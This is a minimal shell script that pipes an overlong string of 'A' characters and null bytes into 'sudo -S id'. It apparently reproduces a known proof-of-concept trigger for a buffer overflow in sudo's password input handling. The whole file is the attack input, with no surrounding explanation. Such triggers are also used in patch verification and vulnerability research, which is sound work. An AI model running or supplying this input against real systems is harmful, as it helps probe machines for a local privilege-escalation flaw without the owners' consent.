#!/bin/sh

perl -e 'print(("A" x 100 . "\x{00}") x 50)' | sudo -S id
